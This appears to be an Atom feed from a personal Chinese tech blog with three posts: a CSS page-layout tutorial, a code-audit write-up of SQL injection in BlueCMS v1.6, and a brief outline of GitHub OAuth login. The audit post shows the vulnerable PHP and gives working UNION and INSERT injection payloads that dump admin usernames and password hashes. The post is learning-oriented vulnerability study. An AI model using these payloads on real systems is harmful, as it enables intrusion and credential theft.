<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>onekingcc&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://onekingcc.github.io/"/>
  <updated>2019-07-11T14:41:15.901Z</updated>
  <id>http://onekingcc.github.io/</id>
  
  <author>
    <name>onekingcc</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>页面中的常见布局</title>
    <link href="http://onekingcc.github.io/2019/07/11/%E5%B7%A9%E5%9B%BA%E9%A1%B5%E9%9D%A2%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%B8%83%E5%B1%80/"/>
    <id>http://onekingcc.github.io/2019/07/11/巩固页面中的常见布局/</id>
    <published>2019-07-11T14:23:40.252Z</published>
    <updated>2019-07-11T14:41:15.901Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>在前端中布局显的非常重要，之前一直不怎么会布局今天抽空把之前学的总结一下变学习一下之前没有学到的然后记录下来，然后有了这篇文章&lt;!--more--&gt;</code></pre><h3 id="单列布局"><a href="#单列布局" class="headerlink" title="单列布局"></a>单列布局</h3><p>这种布局的特点就是头部，主体，底部，等宽，实现这种的单列布局的思路：就是首先有个大的div，设置宽度然后将头部主体和底部进行统一设置，容器里的子块只需要设置一下高度即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        .conter&#123;</span><br><span class="line">            max-width: 960px;   /*设置最大宽度为960像素*/</span><br><span class="line">            margin: 0 auto;     /*内部的元素水平居中*/</span><br><span class="line">        &#125;</span><br><span class="line">        .head&#123;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background: blue;</span><br><span class="line">        &#125;</span><br><span class="line">        .main&#123;</span><br><span class="line">            height: 500px;</span><br><span class="line">            background: pink;</span><br><span class="line">        &#125;</span><br><span class="line">        .footer&#123;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background:olive;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--容器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>= <span class="string">"head"</span>&gt;</span>头部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>底部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562847435896.png" alt="1562847435896"></p><p>还有一种就是单列的布局就是： 宽度自适应内容居中布局，这种布局的特点就是：</p><ul><li><p>头部，和底部自适应页面的宽度，</p></li><li><p>主体固定宽度，要实现这种方式的布局思路：</p><p>1.将头部和尾部放在独立的容器中，</p><p>2.头部和尾部的内容和主体等度</p><p>3.主体仍单独放在单独的容器中，并设置水平居中</p><p>4.调整DOM结构</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--容器--&gt;</span></span><br><span class="line">   </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>= <span class="string">"head"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span> 头部 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span>主体 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span> 底部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562848937251.png" alt="1562848937251"></p><p>可以发现他们的内容已经变成了自适应了也就是用矩形框圈的那部分</p><h3 id="两列布局"><a href="#两列布局" class="headerlink" title="两列布局"></a>两列布局</h3><p>两列布局有4种方式，</p><p>1.左侧固定右侧自适应</p><p>2.两列左右固定中间撑开父级块</p><p>3.右侧固定左侧自适应</p><p>4.两列左右两列绝对定位</p><p>先实现第1种</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    .left&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        float: left;</span><br><span class="line">        background-color: cadetblue;</span><br><span class="line">    &#125;</span><br><span class="line">    .main&#123;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color: blueviolet;</span><br><span class="line">        margin-left: 220px;/*大于等于左侧的宽度就行*/</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.左侧固定并设置左浮动 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 右侧主体部分设置一个右边框，它的宽度只要大于等于左边的宽度就可以 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/562849915137.png" alt="1562849915137"></p><p>接下来说第3种右侧固定左边主体自适应，这个思路跟左边类似同理可得：</p><p><img src="/images/htmlstyle/1562850154381.png" alt="1562850154381"></p><p>现在来看一下第2种两列左右固定中间撑开父级块，这种实现的思路就是：两边采取浮动的方式定义一个父级块这里要考虑一个问题就是如何用子块来撑开父级块。这里采用的是利用after伪类让子块撑开父块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .content&#123;</span><br><span class="line">        width: 960px;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        background-color:burlywood;</span><br><span class="line">        overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear&#123;</span><br><span class="line">        -ms-zoom: 1;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear:after&#123;</span><br><span class="line">        content: &apos;&apos;;</span><br><span class="line">        display: block;</span><br><span class="line">        clear: both;</span><br><span class="line">    &#125;</span><br><span class="line">    .left&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color: aqua;</span><br><span class="line">        float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .right&#123;</span><br><span class="line">        width: 750px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color:rgb(13, 210, 224);</span><br><span class="line">        float: right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;content clear&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;left&quot;&gt;左侧&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;right&quot;&gt;右侧&lt;/div&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562851770177.png" alt="1562851770177"></p><h3 id="三列布局"><a href="#三列布局" class="headerlink" title="三列布局"></a>三列布局</h3><p>1左右两列绝对定位，中间适应布局</p><p>特点：</p><ul><li><p>左右两列固定宽度</p></li><li><p>中间主体区自适应</p></li><li><p>采用浮动加外边距</p></li><li><p>区块的顺序非常重要</p><p>左右这里需要注意的就是先写左右在写主体，DOM顺序不能乱。，中间实际区域是用margin挤压出来，左右两边采用浮动+宽度，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        .left&#123;</span><br><span class="line">            width:200px;</span><br><span class="line">            height: 600px;</span><br><span class="line">            background-color:brown;</span><br><span class="line">            float: left;</span><br><span class="line">        &#125;</span><br><span class="line">        .right&#123;</span><br><span class="line">            width:200px;</span><br><span class="line">            height: 600px;</span><br><span class="line">            background-color:brown;</span><br><span class="line">            float: right;</span><br><span class="line">        &#125;</span><br><span class="line">        .main&#123;</span><br><span class="line">            height: 600px;</span><br><span class="line">            margin-left: 200px;</span><br><span class="line">            margin-right: 200px;</span><br><span class="line">            background-color: #fd8008;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/images/htmlstyle/1562854674592.png" alt="1562854674592"></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>每天都要有收获才行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;在前端中布局显的非常重要，之前一直不怎么会布局今天抽空把之前学的总结一下变学习一下之前没有学到的然后记录下来，然后有了这篇文
      
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="布局" scheme="http://onekingcc.github.io/tags/%E5%B8%83%E5%B1%80/"/>
    
  </entry>
  
  <entry>
    <title>代码审计之SQL注入：bluecms_v1.6</title>
    <link href="http://onekingcc.github.io/2019/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9Abluecms_v1.6/"/>
    <id>http://onekingcc.github.io/2019/07/10/代码审计之SQL注入：bluecms_v1.6/</id>
    <published>2019-07-10T02:59:19.706Z</published>
    <updated>2019-07-10T03:15:40.742Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个cms的漏洞很早就爆出来了，而且很多网站都有相应的文章，这里只是针对自己在代码审计这方面学习的加强，因为自己太菜所以选了一个结构稍微简单，对新手友好一点的cms。<a id="more"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstdudy</p><p>Seay源代码审计系统</p><p>BlueCMS v1.6 sp1源码</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><img src="/images/Bluecmssql/1562685158396.png" alt="1562685158396"></p><p>进入安装阶段，填写相应的数据库，数据库密码安装好之后就是这个界面</p><p><img src="/images/Bluecmssql/1562685307531.png" alt="1562685307531"></p><h3 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h3><p>​    这里由于只是静态的进行审计所以用的notepad++来查看源码然后我们直接把cms放到Seay这个系统里面审一下，当然这个误报挺多的不过对新手来说可以减少很多的工作量，这时我们发现扫出了来了一些。<img src="/2019/07/10/代码审计之SQL注入：bluecms_v1/D:%5Conekingcc%5Csource%5Cimages%5CBluecmssql%5C1562685737530.png" alt="1562685737530"></p><p>发现在upload/ad_js.php存在sql注入，这时我们跟进去看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure><p>发现这里ad_id传入了一个$ad_id，我们发现这个$ad_id是在代码1行那里传过来的id，判断了值是否为空然后执行getone()方法，然后跟进getone这个方法我们发现这个方法在路径uploads\include\mysql.class.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</span><br><span class="line">    $query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    <span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里封装了一个sql查询的函数，指定的类型为数组类型<code>MYSQL_ASSOC</code>是关联数组，<code>mysql_fetch_array</code>函数从结果集中取得一行作为关联数组最后返回行，这里我们已经发现这个过程下来没有没有任何的过滤的，主要是插入到数据库查询语句中的$ad_id没有经过任何的过滤，因而导致了SQL注入。从代码中可以看出：<code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code>说明存在整形注入。</p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>找到程序入口通过order by查询首先查询多少列，我们发现在order by 7无回显在8的时候报错了说明有8列</p><p><img src="/images/Bluecmssql/1562687979352.png" alt="1562687979352"></p><p><img src="/images/Bluecmssql/1562688018782.png" alt="1562688018782"></p><p>用联合查询数据库信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>这里发现显示的是一个空白的页面这时需要右键查看源码发现</p><p><img src="/images/Bluecmssql/1562688268808.png" alt="1562688268808"></p><p>查看当前登录的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union select 1,2,3,4,5,6,user()</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562688330404.png" alt="1562688330404"></p><p>爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562688699934.png" alt="1562688699934"></p><p><img src="/images/Bluecmssql/1562688904920.png" alt="1562688904920"></p><p>发现已经成功爆出表名，这里就不继续了直接构造语句获取用户名的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin</span><br></pre></td></tr></table></figure><p><img src="/images/Bluecmssql/1562689139317.png" alt="1562689139317"></p><p>发现这里md5加密的直接可以在线解密的</p><p><img src="/images/Bluecmssql/1562689291200.png" alt="1562689291200"></p><h3 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h3><p>再查看Seay发现的可疑注入点，在文件/uploads/include/common.fun.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件中有<code>getip()</code>函数，该函数是用来获取用户IP。getenv这个函数是用来获取环境变量的值并没有对$ip进行校验，然后就全局搜索函数，发现有执行sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>这里可以利用拼接的点就是<code>&quot;.getip().&quot;</code>这个点，首先要知道的是在SQL语句中的<code>INSERT INTO</code>来插入内容是可以一次插入多条数据的。这里还是废了点时间的对数据库的操作不是很熟 ，insert into这个插入语句是可以一次插多条数据的，所这时我么可以先闭合前面的单引号然后利用第二条插入。payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1','1'),('','1','1','1','6',(<span class="keyword">select</span> <span class="keyword">concat</span>(admin_name,<span class="string">':'</span>,pwd) <span class="keyword">from</span> blue_admin),<span class="string">'1'</span>,<span class="string">'1</span></span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这是第一次自己整套这么看下来还是挺累的不过这套代码还是比较简单要加强学习啊，要学的东西很多，加强代码审计。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这个cms的漏洞很早就爆出来了，而且很多网站都有相应的文章，这里只是针对自己在代码审计这方面学习的加强，因为自己太菜所以选了一个结构稍微简单，对新手友好一点的cms。&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://onekingcc.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>使用第三方接口授权登录github的流程</title>
    <link href="http://onekingcc.github.io/2019/07/07/%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95github%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <id>http://onekingcc.github.io/2019/07/07/使用第三方接口登录github的流程/</id>
    <published>2019-07-07T06:55:01.000Z</published>
    <updated>2019-07-08T11:11:00.567Z</updated>
    
    <content type="html"><![CDATA[<p>因为最近在写登录这个模块功能的时候，然后选择第三方接口登录，阅读了官方文档的API文档，所以决定记录下来<a id="more"></a>：</p><h2 id="登录情景"><a href="#登录情景" class="headerlink" title="登录情景"></a>登录情景</h2><p>首先有一个用户发送一个消息，请求登录社区，这时点击登录时，首先完成自己的逻辑，去构造相应的证书，client_secret，client，client_id然后再去调用github的接口。</p><h2 id="如何调用github接口"><a href="#如何调用github接口" class="headerlink" title="如何调用github接口"></a>如何调用github接口</h2><ol><li>首先它是去调用的一个授权的地址authorize，当验证通过后github会重新访问社区。</li><li>之后github会主动去回调redirect_uri预先写好的地址携带code访问社区</li><li>社区接受到这里的地址请求时，然后通过access_token解析携带code再次调用github</li><li>这里如果code验证正确，就会返回一个access_token</li><li>这时user携带acces_token,如果正确就会返回user信息</li><li>存入数据库，更新登录状态。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为最近在写登录这个模块功能的时候，然后选择第三方接口登录，阅读了官方文档的API文档，所以决定记录下来&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://onekingcc.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="开发接口" scheme="http://onekingcc.github.io/tags/%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
</feed>
